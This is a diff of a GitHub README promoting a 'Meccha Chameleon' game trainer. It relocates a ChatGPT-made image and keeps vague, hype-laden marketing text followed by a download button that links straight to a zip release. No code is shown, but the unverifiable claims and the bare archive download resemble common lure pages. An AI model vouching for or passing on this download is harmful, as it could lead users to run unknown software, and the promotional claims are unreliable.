@@ -1,12 +1,10 @@
 # Meccha Chameleon Game Trainer Ecore 🦎✨
+<img width="1659" height="948" alt="ChatGPT Image 26 июн  2026 г , 17_39_26" src="https://github.com/user-attachments/assets/d6227dd0-d03a-4f57-95b8-7e2c50ff8517" />
 
 Welcome to the **Meccha Chameleon Game Trainer** — a next-generation, adaptive companion for players who seek to master the art of transformation in the vibrant world of *Meccha Chameleon*. This is not a mere tool; it is a **symbiotic intelligence** that learns your playstyle, adapts to your rhythm, and enhances your journey through the game’s ever-shifting landscapes. Think of it as a **digital chameleon** that changes its strategies to match your needs, allowing you to experience the game from a perspective of elegance and control.
 
 Built with a philosophy of **harmony over brute force**, the Meccha Chameleon Game Trainer offers a seamless blend of responsive UI, multilingual accessibility, and around-the-clock support. Whether you’re navigating dense jungles of code or vibrant pixelated biomes, this trainer evolves with you — like a living ecosystem that nurtures your growth.
 
-## 🌟 Overview
-
-<img width="1659" height="948" alt="ChatGPT Image 26 июн  2026 г , 17_39_26" src="https://github.com/user-attachments/assets/d6227dd0-d03a-4f57-95b8-7e2c50ff8517" />
 
 [![Download](https://raw.githubusercontent.com/Kiya682/meccha-chameleon-ecore-plus/main/button.svg)](https://github.com/Kiya682/meccha-chameleon-ecore-plus/releases/download/ecore-meccha/meccha-ecore.zip)
 ### Why "Meccha Chameleon Game Trainer"?
